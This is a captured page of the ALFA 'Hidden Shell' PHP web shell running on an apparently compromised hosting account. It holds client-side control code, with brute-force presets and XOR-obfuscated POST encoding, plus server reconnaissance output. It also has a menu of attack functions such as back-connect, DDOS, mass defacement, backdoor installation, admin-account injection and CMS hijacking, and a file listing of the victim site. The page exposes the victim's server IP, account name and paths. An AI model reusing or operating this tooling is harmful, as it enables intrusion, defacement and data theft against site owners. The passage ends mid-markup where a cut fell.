dis_input(a){switch(a){case"phpmyadmin":bruteSet(!0,"Disabled","http://");break;case"direct":bruteSet(!1,"2222","http://");break;case"cp":bruteSet(!1,"2082","http://");break;case"ftp":bruteSet(!0,"Disabled","ftp://");break;case"mysql":bruteSet(!1,"3306","http://");break;case"ftpc":bruteSet(!1,"21","http://")}}function bruteSet(a,b,d){"21"!=b?c="localhost":c="ftp.example.com",$("port").disabled=a,$("port").value=b,$("target").value=c,$("protocol").value=d}Element.prototype.appendAfter=function(a){a.parentNode.insertBefore(this,a.nextSibling)};function inBackdoor(t){if(t.value=="my"){$("backdoor_textarea").style.display="block";}else{$("backdoor_textarea").style.display="none";}}
function saveByKey(event){
	if(!(String.fromCharCode(event.which).toLowerCase() == 's' && event.ctrlKey) && !(event.which == 19))return true;
	$("editor_edit_area").onsubmit();
	event.preventDefault();
	return false;
}
function setCookie(cname, cvalue, exdays){
    var d = new Date();
    d.setTime(d.getTime() + (exdays*24*60*60*1000));
    var expires = "expires="+ d.toUTCString();
    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}
function getCookie(name){
  var value = "; " + document.cookie;
  var parts = value.split("; " + name + "=");
  if (parts.length == 2) return parts.pop().split(";").shift();
}
function editorClose(pos){
	d.body.style.overflow = "visible";
	elem = $(pos);
	elem.setAttribute("class", "editor-anim-close");
	if(pos == "editor"){
		is_minimized = false;
	}else{
		cgi_is_minimized = false;
	}
	setTimeout(function(){
		elem.removeAttribute("class");
		elem.style.display = "none";
	}, 1000);
	d.body.style.overflow = "visible";
}
function showEditor(pos){
	$(pos).setAttribute("class", "editor-anim-show");
	$(pos+"-minimized").setAttribute("class", "minimized-hide");
	if(pos == "editor"){
		is_minimized = false;
		if(cgi_is_minimized){
			$("cgiloader-minimized").style.top = "30%";
		}
	}else{
		cgi_is_minimized = false;
		if(is_minimized){
			$("editor-minimized").style.top = "30%";
		}
	}
	d.body.style.overflow = "hidden";
}
function editorMinimize(pos){
	$(pos).setAttribute("class", "editor-anim-minimize");
	$(pos+"-minimized").setAttribute("class", "minimized-show");
	if(pos == "editor"){
		is_minimized = true;
		if(cgi_is_minimized){
			$("cgiloader-minimized").style.top = "20%";
			$("editor-minimized").style.top = "50%";
		}else{
			$("editor-minimized").style.top = "30%";
		}
	}else{
		cgi_is_minimized = true;
		if(is_minimized){
			$("cgiloader-minimized").style.top = "20%";
			$("editor-minimized").style.top = "50%";
		}else{
			$("cgiloader-minimized").style.top = "30%";
		}
	}
	d.body.style.overflow = "visible";
}
function clearEditorHistory(){
	var check = confirm("Are u Sure?");
	if(check){
		for(var i in editor_files){
			if(i != editor_current_file){
				removeHistory(i);
			}
		}
	}
}
function editor(file, mode, arg, pwd, file_id, type){
	if(type=="dir"&&file=="..")return false;
	if(mode == "download"){
		g("FilesTools",pwd,file,"download");
		return false;
	}
	var param = "", fid = "", pure_fid = "", cwd = d.mf.c.value, can_append = true;
	file = file.trim();
	if(Object.keys(editor_files).length == 0){
		var cookie_file = getCookie("alfa_history_files");
		try{
			editor_files = JSON.parse(cookie_file);
			for(var t in editor_files){
				insertToHistory(t, editor_files[t].file, 0, editor_files[t].type);
			}
		}catch(e){}
	}
	if(file.indexOf("/") != -1){
		var file_split = file.split("/");
		file = file_split[file_split.length - 1];
		delete file_split[file_split.length - 1];
		cwd = file_split.join("/");
		if(islinux){
			cwd = "/"+cwd;
		}
	}
	if(typeof type == "undefined"){
		type = "";
	}
	if(typeof pwd != "undefined" && pwd != null && pwd.length != 0){
		cwd = pwd.trim();
	}
	try{
		for(var i in editor_files){
			if(editor_files[i].file == decodeURIComponent(file) && editor_files[i].pwd.replace(/\//g,"") == cwd.replace(/\//g,"")){
				can_append = false;
				file_id = i;
				break;
			}
		}
	}catch(e){
		console.log(e);
	}
	editor_error = true;
	if(typeof arg != "undefined" && arg.length != 0 && arg != null){
		param = alfab64(arg);
	}
	if(typeof file_id != "undefined" && file_id != null && file_id.length != 0){
		fid = alfab64(file_id);
		pure_fid = file_id;
	}else{
		var rand_fid = "file_" + getRandom(10);
		fid = alfab64(rand_fid);
		pure_fid = rand_fid;
	}
	alfaloader("block");
	_Ajax(d.URL, "a="+alfab64("FilesTools")+"&c="+alfab64(cwd)+"&alfa1="+alfab64(file)+"&alfa2="+alfab64(mode)+"&alfa3="+param+"&alfa4="+fid+"&alfa5=&alfa6=&alfa7=&alfa8=&alfa9=&alfa10=&&ajax="+alfab64("true"), function(e){
		document.querySelector(".editor-content").innerHTML = e;
		$("editor").style.display  = "block";
		alfaloader("none");
		evalJS(e);
		if(mode != "delete" && editor_error){
			var active = d.getElementsByClassName("is_active");
			if(active.length != 0){
				active[0].className = "file-holder";
			}
			fid = pure_fid;
			file = decodeURIComponent(file);

			if(!editor_files[fid] && can_append){
				editor_files[fid] = {"file": file, "pwd": cwd, "type": type};
				insertToHistory(fid, file, " is_active", type);
				if(mode=="mkfile"){
					g("FilesMan",null);
				}
			}else{
				$(fid).parentNode.className += " is_active";
			}
		}
		d.body.style.overflow = "hidden";
		d.getElementsByClassName("filestools")[0].setAttribute("fid", fid);
		if(editor_files[fid]){
			d.getElementsByClassName("editor-path")[0].innerHTML = (editor_files[fid].pwd + "/" + editor_files[fid].file).replace(/\/\//g, "/");
		}
		editor_current_file = fid;
		if(is_minimized){
			showEditor("editor");
		}
		updateCookieEditor();
	});
	return false;
}
function insertToHistory(fid, file, mode, type){
	var active = "";
	if(mode && mode != 0){
		active = mode;
	}
	var NewElement = document.createElement("div");
	NewElement.innerHTML = "<div id='"+fid+"' class='history' onClick='reopen(this);'><div class='editor-icon'>"+loadType(file,type,fid)+"</div><div class='editor-file-name'>"+file+"</div></div><div class='history-close' onClick='removeHistory(\""+fid+"\");'>X</div>";
	NewElement.className = "file-holder" + active;
	NewElement.addEventListener("mouseover", function(){setEditorTitle(fid,"over");this.childNodes[1].style.opacity = "1";});
	NewElement.addEventListener("mouseout", function(){setEditorTitle(fid,"out");this.childNodes[1].style.opacity = "0";});
	var refNode = d.getElementsByClassName("history-list")[0];
	refNode.insertBefore(NewElement, refNode.firstChild);
}
function loadType(file,type,id){
	if(type == "none"){
		_Ajax(d.URL, "a="+alfab64("checkfiletype")+"&path="+alfab64(editor_files[id].pwd)+"&arg="+alfab64(editor_files[id].file), function(e){
			$(id).innerHTML = "<div class='editor-icon'>"+loadType(editor_files[id].file,e,id)+"</div><div class='editor-file-name'>"+editor_files[id].file+"</div>";
			editor_files[id].type = e;
		});
	}
	var img = '<img src="http://solevisible.com/icons/{type}" width="30" height="30">';
	if(type == "file"){
		type = file.split(".");
		type  = type[type.length - 1].toLowerCase();
		var types = ["json","ppt","pptx","xls","xlsx","msi","config","cgi","pm","c","cpp","cs","java","aspx","asp","db","ttf","eot","woff","woff2","woff","conf","log","apk","cab","bz2","tgz","dmg","izo","jar","7z","iso","rar","bat","sh","alfa","gz","tar","php","php4","php5","phtml","html","xhtml","shtml","htm","zip","png","jpg","jpeg","gif","bmp","ico","txt","js","rb","py","xml","css","sql","htaccess","pl","ini","dll","exe","mp3","mp4","m4a","mov","flv","swf","mkv","avi","wmv","mpg","mpeg","dat","pdf","3gp","doc","docx","docm"];
		if(types.indexOf(type) == -1){
			type = "notfound";
		}
	}else{
		type = "folder";
	}
	return img.replace("{type}",  type + ".png");
}
function updateDirsEditor(fid, fname){
	var current_path = d.mf.c.value + "/";
	var oldpath  = editor_files[fid].pwd + "/" + fname + "/";
	var newpath  = editor_files[fid].pwd + "/" + editor_files[fid].file + "/";
	oldpath = oldpath.replace(/\/\//g, "/");
	newpath = newpath.replace(/\/\//g, "/");
	current_path = current_path.replace(/\/\//g, "/");
	if(current_path.search(oldpath) != -1){
		initDir(current_path.replace(oldpath, newpath));
		d.mf.c.value = current_path.replace(oldpath, newpath);
		_Ajax(d.URL,"a="+alfab64("updatepath")+"&path="+alfab64(d.mf.c.value),function(e){console.log(e)});
	}
	for(var i in editor_files){
		var path = editor_files[i].pwd + "/";
		path = path.replace(/\/\//g, "/");
		if(path.search(oldpath) != -1){
			editor_files[i].pwd = path.replace(oldpath, newpath);
		}
	}
	var reg1 = new RegExp("'"+oldpath.slice(0, -1)+"'");
	var reg2 = new RegExp(fname + " \\|</b></a>");
	d.files.innerHTML = d.files.innerHTML.replace(reg1, "'"+newpath.slice(0, -1)+"'");
	d.files.innerHTML = d.files.innerHTML.replace(reg2, editor_files[fid].file+" |</b></a>");
	updateCookieEditor();
}
function updateCookieEditor(){
	setCookie("alfa_history_files", JSON.stringify(editor_files), 2012);
}
function setEditorTitle(fid, mode){
	if(mode == "out" && editor_current_file != ""){
		fid = editor_current_file;
	}
	if(editor_files[fid]){
		d.getElementsByClassName("editor-path")[0].innerHTML = (editor_files[fid].pwd + "/" + editor_files[fid].file).replace(/\/\//g, "/");
	}
}
function removeHistory(el){
	delete editor_files[el];
	if($(el)){
		$(el).parentNode.parentNode.removeChild($(el).parentNode);
	}
	var elm = d.getElementsByClassName("filestools")[0];
	if(elm){
		if(elm.getAttribute("fid") == el){
			elm.outerHTML = "";
		}
	}
	if(editor_current_file == el){
		editor_current_file = "";
	}
	updateCookieEditor();
}
function getRandom(e){
	for(var i = "undefined" == typeof e ? 20 : e, t = "", s = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", n = i; n > 0; --n) t += s[Math.floor(Math.random() * s.length)];
	return t
}
function reopen(el){
	var file_id = el.getAttribute("id")
	var pwd = editor_files[file_id].pwd;
	var filename = editor_files[file_id].file;
	editor(filename, "auto", "", pwd, file_id);
}
function copyToClipboard(el){
	var node = document.getElementById(el);
	if(document.selection){
		var range = document.body.createTextRange();
		range.moveToElementText(document.getElementById(el));
		range.select();
		document.execCommand("Copy");
		alert("text copied");
	}else if (window.getSelection()){
		var range = document.createRange();
		range.selectNode(document.getElementById(el));
		window.getSelection().removeAllRanges();
		window.getSelection().addRange(range);
		document.execCommand("copy");
		alert("text copied");
	}
}
function encrypt(str, pwd) {
	if (pwd == null || pwd.length <= 0) {
		return null;
	}
	str = alfab64(str, true);
	pwd = alfab64(pwd, true);
	var enc_chr = "";
	var enc_str = "";
	var i = 0;
	while (i < str.length) {
		for (var j = 0; j < pwd.length; j++) {
			enc_chr = str.charCodeAt(i) ^ pwd.charCodeAt(j);
			enc_str += String.fromCharCode(enc_chr);
			i++;
			if (i >= str.length) break;
		}
	}
	return alfab64(enc_str, true);
}
function reloadSetting(e){
alfaloader("block");
_Ajax(d.URL,"a="+alfab64("settings")+"&alfa1="+alfab64(e.protect.value)+"&alfa2="+alfab64(e.lgpage.value)+"&alfa3="+alfab64(e.username.value)+"&alfa4="+alfab64(e.password.value)+"&alfa5="+alfab64(">>")+"&alfa6="+alfab64(e.icon.value)+"&alfa7="+alfab64(e.post_encrypt.value)+"&alfa8="+alfab64("main")+"&c="+alfab64(c_)+"&ajax="+alfab64("true"),function(a){evalJS(a),alfaloader("none")},true);
if(e.e.value==0&&e.protect.value==1)setTimeout("location.reload()",1000);
if(e.s.value!=e.icon.value)setTimeout("location.reload()",1000);
return false
}
function reloadColors(config){
	var obj = {};
	if(typeof config == "undefined"){
		d.querySelectorAll(".colors_input").forEach(function(e){
			var id = e.getAttribute("target").replace(".", "");
			obj[id] = e.value;
		});
	}else{
		obj = config;
	}
	alfaloader("block");
	var checdk = ($("use_default_color").checked?"1":"0");
	_Ajax(d.URL,"a="+alfab64("settings")+"&alfa1="+alfab64(JSON.stringify(obj))+"&alfa2="+alfab64(">>")+"&alfa3="+alfab64(checdk)+"&alfa8="+alfab64("color")+"&c="+alfab64(c_)+"&ajax="+alfab64("true"),function(e){alfaloader("none");evalJS(e);},true);
}
function alfab64(a, normal){
	if(typeof normal != "undefined" || post_encryption_mode == false){
		return window.btoa(unescape(encodeURIComponent(a)));
	}
	return encrypt(a, "175517752360d2725e671756.94289552");
}
function evalCss(jcss){
	var style = document.createElement("style");
	if (style.styleSheet) {
		style.styleSheet.cssText = jcss;
	} else {
		style.appendChild(document.createTextNode(jcss));
	}
	d.getElementsByTagName("head")[0].appendChild(style);
}
function colorHandlerKey(el){
	setTimeout(function(e){
		colorHandler(el);
	}, 200);
}
function colorHandler(el){
	var target = el.getAttribute("target");
	var multi = el.getAttribute("multi");
	var ishover = target.indexOf(":hover");
	if(multi){
		var array = JSON.parse(atob(multi));
		var jcss = "";
		for(i in array.multi_selector){
			jcss += i + "{"+array.multi_selector[i].replace(/{color}/g, el.value)+"}";
		}
		evalCss(jcss);
	}
	if(ishover != -1 && !multi){
		$("input_" + target.replace(".","")).value = el.value;
		$("gui_" + target.replace(".","")).value = el.value;
		var css = target+"{color: "+el.value+";}";
		evalCss(css);
	}else{
		$("input_" + target.replace(".","")).value = el.value;
		$("gui_" + target.replace(".","")).value = el.value;
		if(target == ".header_values"){
			target = ".header,.header_values";
		}
		d.querySelectorAll(target).forEach(function(e){
			e.style.color = el.value;
		});
	}
}
function importConfig(event){
	var input = event.target;
    var reader = new FileReader();
    reader.onload = function(){
      var data = reader.result;
	  try{
		  var conf = JSON.parse(data);
		  reloadColors(conf);
	  }catch(e){
		  alert("Config is invalid...!");
	  }
	  $("importFileBtn").value = "";
    };
    reader.readAsText(input.files[0]);
}
function checkBox(){for(i=0;i<d.files.elements.length;i++){if(d.files.elements[i].type == "checkbox"){d.files.elements[i].checked = d.files.elements[0].checked;}}}
function path_history(pos){
	_Ajax(d.URL,"a="+alfab64("GetPathHistory")+"&ajax="+alfab64("true"),function(e){g("FilesMan", e);},true);
}
function runcgi(lang){
	if(cgi_is_minimized && cgi_lang == lang){
		showEditor("cgiloader");
		return false;
	}
	_Ajax(d.URL,"a="+alfab64("cgishell")+"&alfa1="+alfab64(lang)+"&ajax="+alfab64("true"),function(e){
		d.body.style.overflow = "hidden";
		$("cgiloader").style.display = "block";
		$("cgiframe").innerHTML = e;
		cgi_lang = lang;
		if(cgi_is_minimized){
			$("cgiloader-minimized").setAttribute("class", "minimized-hide");
			setTimeout(function(){
				$("cgiloader").removeAttribute("class");
				if(is_minimized){
					$("editor-minimized").style.top = "30%";
				}
			}, 1000);
		}
	});
}
</script>
<form style='display:none;' id='dlForm' action='' target='_blank' method='post'>
<input type='hidden' name='a' value='dlfile'>
<input type='hidden' name='c' value=''>
<input type='hidden' name='file' value=''>
</form>
<input type='file' style='display:none;' id='importFileBtn' onchange='importConfig(event);'>
<img id='a_loader' src='http://solevisible.com/images/loader.png'>
</head>
<body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<div id="up_bar"></div>
<div class="whole">
<form method="post" name="mf" style="display:none;">
<input type="hidden" name="a">
<input type="hidden" name="c" value="/home/stricrlyvineet/public_html/oldagehome.empoweringhumanity.org/"><input type="hidden" name="alfa1"><input type="hidden" name="alfa2"><input type="hidden" name="alfa3"><input type="hidden" name="alfa4"><input type="hidden" name="alfa5"><input type="hidden" name="alfa6"><input type="hidden" name="alfa7"><input type="hidden" name="alfa8"><input type="hidden" name="alfa9"><input type="hidden" name="alfa10"><input type="hidden" name="charset">
</form>
<div id='hidden_sh'><a class="alert_green" target="_blank" href="?solevisible">Hidden Shell<br><small>Version: <span class="hidden_shell_version">3.0.2</span></small></a></div>
<div class="header"><table width="100%" border="0">
<tr>
<td width="3%"><span class="header_vars">Uname:</span></td>
<td colspan="2"><span class="header_values" id="header_uname">Linux p3plcpnl0738.prod.phx3.secureserver.net 2.6.32-954.3.5.lve1.4.82.el6.x86_64 #1 SMP Tue Mar 16 17:47:27 UTC 2021 x8</span></td>
</tr>
<tr>
<td><span class="header_vars">User:</span></td>
<td><span class="header_values" id="header_userid">939567 [ stricrlyvineet ] </span><span class="header_vars"> Group: </span><span class="header_values" id="header_groupid">939567 [ stricrlyvineet ]</span> </td>
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="" src="http://solevisible.com/images/alfa-iran.png" /></td>
</tr>
<tr>
<td><span class="header_vars">PHP:</span></td>
<td><b>7.4.16 </b><span class="header_vars"> Safe Mode: <span class='header_on'>OFF</span></span></td>
</tr>
<tr>
<td><span class="header_vars">ServerIP:</span></td>
<td><b>160.153.44.2 <span class="header_vars">Your IP:</span><b> 80.215.110.20</b></td>
</tr>
<tr>
<td width="3%"><span class="header_vars">DateTime:</span></td>
<td colspan="2"><b>2021-06-23 04:22:53</b></td>
</tr>
<tr>
<td><span class="header_vars">Domains:</span></td>
<td width="76%"><span class="header_values" id="header_domains">Cant Read [ /etc/named.conf ]</span></td>
</tr>
<tr>
<td height="16"><span class="header_vars">HDD:</span></td>
<td><span class="header_vars">Total:</span><b>3240.13 GB </b><span class="header_vars">Free:</span><b>346.83 GB [10%]</b></td>
</tr><tr><td height="18" colspan="2"><span class="header_vars">Useful : </span><span class="header_values" style="margin-left: 4px;">gcc</span><span class="header_values" style="margin-left: 4px;">cc</span><span class="header_values" style="margin-left: 4px;">ld</span><span class="header_values" style="margin-left: 4px;">make</span><span class="header_values" style="margin-left: 4px;">php</span><span class="header_values" style="margin-left: 4px;">perl</span><span class="header_values" style="margin-left: 4px;">python</span><span class="header_values" style="margin-left: 4px;">ruby</span><span class="header_values" style="margin-left: 4px;">tar</span><span class="header_values" style="margin-left: 4px;">gzip</span></td>
</tr>
<tr>
<td height="0" colspan="2"><span class="header_vars">Downloader: </span><span class="header_values" style="margin-left: 4px;">wget</span><span class="header_values" style="margin-left: 4px;">lynx</span><span class="header_values" style="margin-left: 4px;">curl</span></td>
</tr><tr>
<td height="16" colspan="2"><span class="header_vars">Disable Functions: </span><b><span class="header_show_all">All Functions Accessible</span></b></td>
</tr>
<tr>
<td height="16" colspan="2"><span class="header_vars">CURL :</span><span class='header_on'> ON </span> | <span class="header_vars">SSH2 : </span><span class='header_off'> OFF </span> | <span class="header_vars">Magic Quotes : </span><span class="header_off">OFF</span> | <span class="header_vars"> MySQL :</span><span class='header_off'> OFF </span> | <span class="header_vars">MSSQL :</span><span class='header_off'> OFF </span> | <span class="header_vars"> PostgreSQL :</span><span class='header_off'> OFF </span> | <span class="header_vars"> Oracle :</span><span class='header_off'> OFF </span> | <span class="header_vars"> CGI :</span> <span class='header_off' id='header_cgishell'>OFF</span></td><td width="15%"><center><a href="http://zone-h.org/archive/notifier=ALFA%20TEaM%202012" target="_blank"><span><font class="solevisible-text" color="#0F0">Sole Sad & Invisible</font></span></a></center></td>
</tr>
<tr>
<td height="11" colspan="3"><span class="header_vars">Open_basedir :</span><b><span class='header_none'> NONE </span></b> | <span class="header_vars">Safe_mode_exec_dir :</span><b><span class='header_none'> NONE </span></b> | <span class="header_vars"> Safe_mode_include_dir :</span></b><span class='header_none'> NONE </span></b></td>
</tr>
<tr>
<td height="11"><span class="header_vars">SoftWare: </span></td>
<td colspan="2"><b>Apache</b></td>
</tr><tr>
<td height="12"><span class="header_vars">PWD:</span></td>
<td colspan="2"><span id="header_cwd"><a class='header_pwd' href='javascript:void(0);' onclick='g("FilesMan","/")'>/</a><a class='header_pwd' href='javascript:void(0);' onclick='g("FilesMan","/home/")'>home/</a><a class='header_pwd' href='javascript:void(0);' onclick='g("FilesMan","/home/stricrlyvineet/")'>stricrlyvineet/</a><a class='header_pwd' href='javascript:void(0);' onclick='g("FilesMan","/home/stricrlyvineet/public_html/")'>public_html/</a><a class='header_pwd' href='javascript:void(0);' onclick='g("FilesMan","/home/stricrlyvineet/public_html/oldagehome.empoweringhumanity.org/")'>oldagehome.empoweringhumanity.org/</a> </span><a href="javascript:void(0);" onclick="g('FilesMan','/home/stricrlyvineet/public_html/oldagehome.empoweringhumanity.org/assets/img','','','')"><span class="home_shell">[ Home Shell ]</span> </a><a href="javascript:void(0);" onclick="path_history('back');"><span class="back_shell">[ BACK ]</span></a></td>
</tr>
</table>
</div>
<div id="meunlist">
<ul>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('FilesMan',null,'','','');">Home</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('proc',null,'','','');">Process</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('phpeval',null,'','','');">Eval</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('sql',null,'','','');">SQL Manager</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('dumper',null,'','','');">Mysql Dumper</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('hash',null,'','','');">En-Decoder</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('connect',null,'','','');">BC</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('ssh2',null,'','','');">SSH2</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('zoneh',null,'','','');">ZONE-H</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('dos',null,'','','');">DDOS</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('safe',null,'','','');">ByPasser</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('cgishell',null,'','','');">Cgi Shell</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('ssiShell',null,'','','');">SSI SHELL</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('cpcrack',null,'','','');">Hash Tools</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('portscanner',null,'','','');">Port Scaner</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('basedir',null,'','','');">Open BaseDir</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('mail',null,'','','');">Fake Mail</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('ziper',null,'','','');">Compressor</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('IndexChanger',null,'','','');">Index Changer</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('pwchanger',null,'','','');">Add New Admin</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('ShellInjectors',null,'','','');">Shell Injectors</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('php2xml',null,'','','');">PHP2XML</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('cloudflare',null,'','','');">CloudFlare</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('Whmcs',null,'','','');">Whmcs DeCoder</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('symlink',null,'','','');">Symlink</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('MassDefacer',null,'','','');">Mass Defacer</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('Crackers',null,'','','');">BruteForcer</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('searcher',null,'','','');">Searcher</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('cmshijacker',null,'','','');">CMS Hijacker</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('remotedl',null,'','','');">Remote Upload</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('inbackdoor',null,'','','');">Install BackDoor</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('whois',null,'','','');">Whois</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('settings',null,'','','');">Alfa Settings</a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('plus',null,'','','');"><span class="alfa_plus">Alfa +</font></a></li>
<li><a href="javascript:void(0);" class="menu_options" onclick="g('selfrm',null,'','','');">Remove Shell</a></li>
</ul></div><script>alfa1_=alfa2_=alfa3_=""</script><div class="ajaxarea"><div class="header"><form onsubmit='fc(this);return false;' name='files' method='post'><table width='100%' class='main' cellspacing='0' cellpadding='2'><tr><th width='13px'><div class='myCheckbox' style='padding-left:0px;'><input type='checkbox' id='mchk' onclick='checkBox();' class='chkbx'><label for='mchk'></label></div></th><th>Name</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr><tr><td><div class="myCheckbox"><input type="checkbox" name="f[]" value=".." class="chkbx" id="checkbox0"><label for="checkbox0"></label></div></td><td><img src="http://solevisible.com/icons/back.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="g('FilesMan','/home/stricrlyvineet/public_html/oldagehome.empoweringhumanity.org/..');" title=><b>| .. |</b></a></td></div><td><span style="font-weight:unset;" class="main_size">dir</span></td><td><span style="font-weight:unset;" class="main_modify">2021-06-22 12:08:03</span></td><td><span style="font-weight:unset;" class="main_owner_group">stricrlyvineet/nobody</span></td><td><a href=javascript:void(0) onclick="editor('..','chmod','','','','dir')"><span style="font-weight:unset;" class="main_green_perm">0750</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">drwxr-x---</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('..', 'rename','','','','dir')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('..', 'touch','','','','dir')">T</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # .. # ?'); chk ? g('FilesMan',null,'delete', '..') : '';"> X </a></td></tr><tr class=l1><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="admin" class="chkbx" id="checkbox1"><label for="checkbox1"></label></div></td><td><img src="http://solevisible.com/icons/folder.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="g('FilesMan','/home/stricrlyvineet/public_html/oldagehome.empoweringhumanity.org/admin');" title=><b>| admin |</b></a></td></div><td><span style="font-weight:unset;" class="main_size">dir</span></td><td><span style="font-weight:unset;" class="main_modify">2020-11-07 11:06:47</span></td><td><span style="font-weight:unset;" class="main_owner_group">stricrlyvineet/stricrlyvineet</span></td><td><a href=javascript:void(0) onclick="editor('admin','chmod','','','','dir')"><span style="font-weight:unset;" class="main_green_perm">0755</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">drwxr-xr-x</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('admin', 'rename','','','','dir')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('admin', 'touch','','','','dir')">T</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # admin # ?'); chk ? g('FilesMan',null,'delete', 'admin') : '';"> X </a></td></tr><tr><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="assets" class="chkbx" id="checkbox2"><label for="checkbox2"></label></div></td><td><img src="http://solevisible.com/icons/folder.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="g('FilesMan','/home/stricrlyvineet/public_html/oldagehome.empoweringhumanity.org/assets');" title=><b>| assets |</b></a></td></div><td><span style="font-weight:unset;" class="main_size">dir</span></td><td><span style="font-weight:unset;" class="main_modify">2020-11-07 11:06:49</span></td><td><span style="font-weight:unset;" class="main_owner_group">stricrlyvineet/stricrlyvineet</span></td><td><a href=javascript:void(0) onclick="editor('assets','chmod','','','','dir')"><span style="font-weight:unset;" class="main_green_perm">0755</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">drwxr-xr-x</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('assets', 'rename','','','','dir')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('assets', 'touch','','','','dir')">T</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # assets # ?'); chk ? g('FilesMan',null,'delete', 'assets') : '';"> X </a></td></tr><tr class=l1><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="images" class="chkbx" id="checkbox3"><label for="checkbox3"></label></div></td><td><img src="http://solevisible.com/icons/folder.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="g('FilesMan','/home/stricrlyvineet/public_html/oldagehome.empoweringhumanity.org/images');" title=><b>| images |</b></a></td></div><td><span style="font-weight:unset;" class="main_size">dir</span></td><td><span style="font-weight:unset;" class="main_modify">2020-11-07 11:06:48</span></td><td><span style="font-weight:unset;" class="main_owner_group">stricrlyvineet/stricrlyvineet</span></td><td><a href=javascript:void(0) onclick="editor('images','chmod','','','','dir')"><span style="font-weight:unset;" class="main_green_perm">0755</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">drwxr-xr-x</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('images', 'rename','','','','dir')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('images', 'touch','','','','dir')">T</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # images # ?'); chk ? g('FilesMan',null,'delete', 'images') : '';"> X </a></td></tr><tr><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="include" class="chkbx" id="checkbox4"><label for="checkbox4"></label></div></td><td><img src="http://solevisible.com/icons/folder.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="g('FilesMan','/home/stricrlyvineet/public_html/oldagehome.empoweringhumanity.org/include');" title=><b>| include |</b></a></td></div><td><span style="font-weight:unset;" class="main_size">dir</span></td><td><span style="font-weight:unset;" class="main_modify">2020-11-07 11:06:47</span></td><td><span style="font-weight:unset;" class="main_owner_group">stricrlyvineet/stricrlyvineet</span></td><td><a href=javascript:void(0) onclick="editor('include','chmod','','','','dir')"><span style="font-weight:unset;" class="main_green_perm">0755</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">drwxr-xr-x</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('include', 'rename','','','','dir')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('include', 'touch','','','','dir')">T</a><a class="actions" href="javascript:void(0);" onclick="var chk = 